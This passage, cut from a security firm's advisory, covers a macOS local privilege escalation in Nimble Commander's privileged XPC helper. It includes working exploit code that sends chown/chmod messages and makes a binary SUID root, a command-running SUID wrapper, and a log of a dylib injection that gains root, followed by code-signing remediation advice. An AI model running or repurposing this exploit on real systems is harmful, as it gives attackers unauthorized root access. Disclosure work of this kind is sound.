</span></span><span style=display:flex><span><span style=color:#a6e22e>xpc_dictionary_set_string</span>(chmod_operation, <span style=color:#e6db74>&#34;path&#34;</span>, <span style=color:#e6db74>&#34;/Users/garrido/Research/privesc&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>xpc_dictionary_set_int64</span>(chmod_operation, <span style=color:#e6db74>&#34;mode&#34;</span>, <span style=color:#ae81ff>04755</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>xpc_connection_t</span> conn <span style=color:#f92672>=</span> <span style=color:#a6e22e>xpc_connection_create_mach_service</span>(SERVICE, NULL, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>xpc_connection_set_event_handler</span>(conn, <span style=color:#f92672>^</span>(<span style=color:#66d9ef>xpc_object_t</span> event){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] Received Message on generic handler</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;%s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#a6e22e>xpc_copy_description</span>(event));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>});
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>xpc_connection_resume</span>(conn);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>xpc_connection_send_message_with_reply</span>(conn, authentication, NULL, <span style=color:#f92672>^</span>(<span style=color:#66d9ef>xpc_object_t</span> event){
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] Authentication Message: %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, event);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] Authentication Description: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#a6e22e>xpc_copy_description</span>(event));
</span></span><span style=display:flex><span>	BOOL response <span style=color:#f92672>=</span> <span style=color:#a6e22e>xpc_dictionary_get_bool</span>(event, <span style=color:#e6db74>&#34;ok&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] Authentication results: %hhd</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>&#34;</span>, response);
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>xpc_connection_send_message_with_reply</span>(conn, chown_operation, NULL, <span style=color:#f92672>^</span>(<span style=color:#66d9ef>xpc_object_t</span> event)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] Change Owner - chown [HandleChOwn]  Message: %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, event);
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] Change Owner  - chown [HandleChOwn] Description: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#a6e22e>xpc_copy_description</span>(event));
</span></span><span style=display:flex><span>		BOOL response <span style=color:#f92672>=</span> <span style=color:#a6e22e>xpc_dictionary_get_bool</span>(event, <span style=color:#e6db74>&#34;ok&#34;</span>);
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] Change Owner - chown [HandleChOwn] results: %hhd</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>&#34;</span>, response);
</span></span><span style=display:flex><span>	});	
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>xpc_connection_send_message_with_reply</span>(conn, chmod_operation, NULL, <span style=color:#f92672>^</span>(<span style=color:#66d9ef>xpc_object_t</span> event)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] Change permissions - suid [HandleChMod] Message: %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, event);
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] Change permissions - suid [HandleChMod] Description: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#a6e22e>xpc_copy_description</span>(event));
</span></span><span style=display:flex><span>		BOOL response <span style=color:#f92672>=</span> <span style=color:#a6e22e>xpc_dictionary_get_bool</span>(event, <span style=color:#e6db74>&#34;ok&#34;</span>);
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] Change permissions - suid [HandleChMod] results: %hhd</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>&#34;</span>, response);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	});
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>});
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>sleep</span>(<span style=color:#ae81ff>10</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><ul><li><h3 id=suid-binary>SUID Binary:</h3></li></ul><p>The target binary <code>(privesc)</code>, for which the server <code>(info.filesmanager.Files.PrivilegedIOHelperV2)</code> will assign <code>SUID</code> permissions, as well as set the <code>root</code> user and the <code>wheel</code> group as <em><strong>owners</strong></em>, will be one that executes arbitrary system commands via the <code>execvp</code> function:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span> argv)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span><span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] EUID: %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#a6e22e>geteuid</span>());
</span></span><span style=display:flex><span><span style=color:#a6e22e>execvp</span>(argv[<span style=color:#ae81ff>1</span>], <span style=color:#f92672>&amp;</span>argv[<span style=color:#ae81ff>1</span>]); 
</span></span><span style=display:flex><span><span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=client-validation-bypass---privilege-escalation>Client Validation Bypass - Privilege Escalation:</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>garrido@Garridos-MacBook-Air Research % ls -l privesc
</span></span><span style=display:flex><span>-rwxr-xr-x  <span style=color:#ae81ff>1</span> garrido  staff  <span style=color:#ae81ff>49520</span> Jul <span style=color:#ae81ff>21</span> 15:24 privesc
</span></span><span style=display:flex><span>garrido@Garridos-MacBook-Air Research % ./privesc whoami
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> EUID: <span style=color:#ae81ff>501</span>
</span></span><span style=display:flex><span>garrido
</span></span><span style=display:flex><span>garrido@Garridos-MacBook-Air Research % DYLD_INSERT_LIBRARIES<span style=color:#f92672>=</span>NimbleCommander3.dylib /Volumes/Nimble<span style=color:#ae81ff>\ </span>Commander/Nimble<span style=color:#ae81ff>\ </span>Commander.app/Contents/MacOS/Nimble<span style=color:#ae81ff>\ </span>Commander
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Nimble Commander - macOS Local Privilege Escalation Exploit:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Authentication Message: 0x600002990000
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Authentication Description: &lt;dictionary: 0x600002990000&gt; <span style=color:#f92672>{</span> count <span style=color:#f92672>=</span> 1, transaction: 0, voucher <span style=color:#f92672>=</span> 0x0, contents <span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;ok&#34;</span> <span style=color:#f92672>=</span>&gt; &lt;bool: 0x7ff848d0e190&gt;: true
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Authentication results: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Change Owner - chown <span style=color:#f92672>[</span>HandleChOwn<span style=color:#f92672>]</span>  Message: 0x600002998000
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Change Owner  - chown <span style=color:#f92672>[</span>HandleChOwn<span style=color:#f92672>]</span> Description: &lt;dictionary: 0x600002998000&gt; <span style=color:#f92672>{</span> count <span style=color:#f92672>=</span> 1, transaction: 0, voucher <span style=color:#f92672>=</span> 0x0, contents <span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;ok&#34;</span> <span style=color:#f92672>=</span>&gt; &lt;bool: 0x7ff848d0e190&gt;: true
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Change Owner - chown <span style=color:#f92672>[</span>HandleChOwn<span style=color:#f92672>]</span> results: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Change permissions - suid <span style=color:#f92672>[</span>HandleChMod<span style=color:#f92672>]</span> Message: 0x600002998000
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Change permissions - suid <span style=color:#f92672>[</span>HandleChMod<span style=color:#f92672>]</span> Description: &lt;dictionary: 0x600002998000&gt; <span style=color:#f92672>{</span> count <span style=color:#f92672>=</span> 1, transaction: 0, voucher <span style=color:#f92672>=</span> 0x0, contents <span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;ok&#34;</span> <span style=color:#f92672>=</span>&gt; &lt;bool: 0x7ff848d0e190&gt;: true
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Change permissions - suid <span style=color:#f92672>[</span>HandleChMod<span style=color:#f92672>]</span> results: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>^C
</span></span><span style=display:flex><span>garrido@Garridos-MacBook-Air Research % ls -l privesc   
</span></span><span style=display:flex><span>-rwsr-xr-x  <span style=color:#ae81ff>1</span> root  wheel  <span style=color:#ae81ff>49520</span> Jul <span style=color:#ae81ff>21</span> 15:24 privesc
</span></span><span style=display:flex><span>garrido@Garridos-MacBook-Air Research % ./privesc whoami
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> EUID: <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>root
</span></span></code></pre></div><h2 id=remediation>Remediation:</h2><p>The <code>NSXPCConnection</code> class has a public property <em><strong>(processIdentifier)</strong></em> and a private property <em><strong>(auditToken)</strong></em>. These properties store the <code>PID</code> and <code>audit token</code> of the connecting process, respectively. Relying on <em><strong>processIdentifier</strong></em> is insecure <code>(PID Reuse attack)</code>, but gaining access to the <em><strong>auditToken</strong></em> requires the workaround shown below:</p><p>We create an <code>ExtendedNSXPCConnection</code> extension to the <code>NSXPConnection</code> class, and define the <em><strong>auditToken</strong></em> property. Next, we implement this class. We can then type cast the connection to <code>ExtendedNSXPCConnection</code>, allowing us to access the <em><strong>auditToken</strong></em> private attribute.</p><p>The problem with this method is that <em><strong>auditToken</strong></em> is a private property, which Apple could change at any time. This would make our code unrealiable in the long run. Alternatively, we could choose the insecure <em><strong>PID</strong></em>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>@</span>interface ExtendedNSXPCConnection : NSXPCConnection
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>audit_token_t</span> auditToken;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>@</span>property <span style=color:#66d9ef>audit_token_t</span> auditToken;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>@</span>end
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>@</span>implementation ExtendedNSXPCConnection
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>@</span>synthesize auditToken;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>@</span>end
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>((ExtendedNSXPCConnection<span style=color:#f92672>*</span>)newConnection).auditToken
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>In the case of <code>audit tokens</code>, we can verify <code>code signing</code> with the code shown below:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>NSString requirementString <span style=color:#f92672>=</span> <span style=color:#960050;background-color:#1e0010>@</span><span style=color:#e6db74>&#34;anchor trusted and identifier </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>com.app.bundle</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> and certificate leaf [subject.CN] = </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>TEAMID</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> and info [CFBundleShortVersionString] &gt;= </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>2.0</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>SecTaskRef taskRef <span style=color:#f92672>=</span> <span style=color:#a6e22e>SecTaskCreateWithAuditToken</span>(NULL,
</span></span><span style=display:flex><span>((ExtendedNSXPCConnection<span style=color:#f92672>*</span>)newConnection).auditToken);
</span></span><span style=display:flex><span><span style=color:#a6e22e>SecTaskValidateForRequirement</span>(taskRef, (__bridge CFStringRef)(requirementString))
</span></span></code></pre></div><p>On the other hand, as stated earlier, <em><strong>if we do not want to verify the client version, we should still verify its code signing flags</strong></em>. With the following code, we can retrieve a dictionary (<code>csInfo</code>) containing all code signing information using <code>SecCodeCopySigningInformation</code>. From <code>csInfo</code>, we extract the <code>code signing flags (csFlags)</code> using the <code>kSecCodeInfoStatus</code> key:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>
</span></span><span style=display:flex><span>CFDictionaryRef csInfo <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>SecCodeCopySigningInformation</span>(code, kSecCSDynamicInformation, <span style=color:#f92672>&amp;</span>csInfo);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>uint32_t</span> csFlags <span style=color:#f92672>=</span> [((__bridge NSDictionary <span style=color:#f92672>*</span>)csInfo)[(__bridge NSString <span style=color:#f92672>*</span>)kSecCodeInfoStatus] intValue];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#66d9ef>uint32_t</span> cs_require_lv <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x2000</span>; <span style=color:#75715e>// Library validation.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>const</span> <span style=color:#66d9ef>uint32_t</span> cs_kill <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x200</span>; <span style=color:#75715e>// Kill process if page is not valid.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>const</span> <span style=color:#66d9ef>uint32_t</span> cs_restrict <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x800</span>; <span style=color:#75715e>// Prevent debugging.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>const</span> <span style=color:#66d9ef>uint32_t</span> cs_runtime <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x10000</span>; <span style=color:#75715e>// Hardened runtime.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>const</span> <span style=color:#66d9ef>uint32_t</span> cs_hard <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x100</span>; <span style=color:#75715e>// Do not load invalid pages.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ((csFlags <span style=color:#f92672>&amp;</span> (cs_hard<span style=color:#f92672>|</span> cs_require_lv)))
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> Yes; <span style=color:#75715e>//Accept connection.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span></code></pre></div><p>We can also retrieve the <em><strong>entitlements</strong></em> from the <code>csInfo</code> dictionary:</p><p>We retrieve the <em><strong>entitlements</strong></em> from a sub-dictionary with the <strong>entitlements-dict</strong> key.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>CFDictionaryRef csInfo <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>SecCodeCopySigningInformation</span>(code, kSecCSDynamicInformation, <span style=color:#f92672>&amp;</span>csInfo);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>NSDictionary <span style=color:#f92672>*</span> signingDic <span style=color:#f92672>=</span> <span style=color:#a6e22e>CFBridgingRelease</span>(csInfo);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>NSDictionary <span style=color:#f92672>*</span> entitlementsDic <span style=color:#f92672>=</span> [signingDic objectForKey:<span style=color:#960050;background-color:#1e0010>@</span><span style=color:#e6db74>&#34;entitlements-dict&#34;</span>];
</span></span></code></pre></div><ul><li><strong>Important:</strong> We can use the same steps to verify <em><strong>code signature</strong></em> when we use the classic C API for <em>XPC Connections</em>.</li></ul></div></div></section><section class="section solution-area bg-secondary" id=services><div class=container><div class=title-area><h2 class="text-white fs-1">Services</h2></div><div class=solution-items><div class=solutionItem><img src=/imgs/solution-shap.png class=solution-bg alt><div class=solutionItem-icon><img src=/imgs/jpenetration-testing.svg alt></div><div class=solutionItem-content><div class=inner><h3>Penetration Testing</h3><p>Proactive assessment using tactics, techniques, and procedures of actual attackers to identify security flaws, incorrect configurations, and vulnerabilities.</p></div><a href=/penetration-testing/ class="btn btn-primary">Learn more</a></div></div><div class=solutionItem><img src=/imgs/solution-shap.png class=solution-bg alt><div class=solutionItem-icon><img src=/imgs/application-security.svg alt></div><div class=solutionItem-content><div class=inner><h3>Application Security Testing</h3><p>Comprehensive application protection, ensuring robust security throughout the entire software development lifecycle.</p></div><a href=/application-security-testing/ class="btn btn-primary">Learn more</a></div></div><div class=solutionItem><img src=/imgs/solution-shap.png class=solution-bg alt><div class=solutionItem-icon><img src=/imgs/red-team.svg alt></div><div class=solutionItem-content><div class=inner><h3>Red Team Exercises</h3><p>Simulate and emulate advanced cyber attacks to pinpoint vulnerabilities and test your organization's defense mechanisms, ensuring robust resilience against real-world threats.</p></div><a href=/red-team-exercises/ class="btn btn-primary">Learn more</a></div></div><div class=solutionItem><img src=/imgs/solution-shap.png class=solution-bg alt><div class=solutionItem-icon><img src=/imgs/management.svg alt></div><div class=solutionItem-content><div class=inner><h3>Vulnerability Management</h3><p>Proactive process to identify, prioritize, and address security vulnerabilities in systems and software, enhancing an organization's defense against evolving cyber threats.</p></div><a href=/vulnerability-management/ class="btn btn-primary">Learn more</a></div></div></div></div></section><footer class="footer bg-primary"><div class=container><div class="footer-wrapper d-flex justify-content-between align-items-stretch"><div class="footer-start d-flex flex-md-column justify-content-between"><div class=footer-logo><a href=/><img src=/imgs/logo-white.svg alt></a></div><div class=footer-contact><div class=footer-address><ul><li><h4 style=margin-bottom:5px>Dominican Republic</h4><p>Ave. Gustavo MejÃ­a Ricart No. 106<br>Torre Piantini, Local 201<br>Santo Domingo</p></li><li><h4 style=margin-bottom:5px>United States</h4><p>66 W Flagler Street, Suite 900<br>PMB 10131<br>Miami, FL 33130</p></li><li><h4 style=margin-bottom:5px>Contact Us</h4><p><a href id=nfo_email></a></p></li></ul></div><div class=footer-address style=margin-top:25px><h4>Connect</h4><div class=footer-social><a href=https://www.linkedin.com/company/pentraze><img src=/imgs/linkedin.svg></a>&nbsp;
<a href=https://twitter.com/PentrazeSec><img src=/imgs/twitter.svg></a>&nbsp;
<a href=https://instagram.com/pentraze_sec><img src=/imgs/insta.svg></a></div></div></div></div><div class="d-block flex-grow-1 ps-lg-5"><div class=footer-heading><h4>Services</h4></div><div class=row><div class="col-md-3 col-6"><div class=footer-widget><h4><a href=/penetration-testing/>Penetration Testing</a></h4><ul><li><a href=/penetration-testing/#external>External</a></li><li><a href=/penetration-testing/#internal>Internal</a></li><li><a href=/penetration-testing/#wireless>Wireless</a></li><li><a href=/penetration-testing/#cloud>Cloud</a></li><li><a href=/penetration-testing/#custom>Custom</a></li></ul></div></div><div class="col-md-3 col-6"><div class=footer-widget><h4><a href=/application-security-testing/>Application Security Testing</a></h4><ul><li><a href=/application-security-testing/#web-application>Web Application</a></li><li><a href=/application-security-testing/#mobile-application>Mobile Application</a></li><li><a href=/application-security-testing/#api>API</a></li><li><a href=/application-security-testing/#secure-software-development-life-cycle>SSDLC</a></li><li><a href=/application-security-testing/#source-code-review>Source Code Review</a></li><li><a href=/application-security-testing/#devsecops-integration>DevSecOps Integration</a></li><li><a href=/application-security-testing/#static-application-security-testing-sast>SAST</a></li><li><a href=/application-security-testing/#dynamic-application-security-testing-dast>DAST</a></li></ul></div></div><div class="col-md-3 col-6"><div class=footer-widget><h4><a href=/red-team-exercises/>Red Team Exercises</a></h4><ul><li><a href=/red-team-exercises/#adversary-emulation>Adversary Emulation</a></li><li><a href=/red-team-exercises/#adversary-simulation>Adversary Simulation</a></li></ul></div></div><div class="col-md-3 col-6"><div class=footer-widget><h4><a href=/vulnerability-management/>Vulnerability Management</a></h4><ul><li><a href=/vulnerability-management/#periodic-vulnerability-scanning>Periodic Vulnerability Assessments</a></li><li><a href=/vulnerability-management/#risk-analysis-and-prioritization>Risk Analysis and Prioritization</a></li><li><a href=/vulnerability-management/#patch-and-remediation-guidance>Patch and Remediation Guidance</a></li><li><a href=/vulnerability-management/#compliance-monitoring>Compliance Monitoring</a></li></ul></div></div></div><div class="text-lg-end footer-copy"><p class=mb-0>&copy; 2024 - Pentraze Cybersecurity. All rights reserved.</p></div></div></div></div></footer><script src=/js/jquery-3.6.0.min.js></script><script src=/js/bootstrap.bundle.min.js></script><script src=/js/owl.carousel.min.js></script><script src=/js/minisearch.js></script><script src=/js/scripts.min.575dff45695cf0dd77aa5147d6da4b5c93f6f9157fee5c936198490487bef4e9.js></script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9006390c1ba794a1',t:'MTczNjYxMjMwOC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body></html>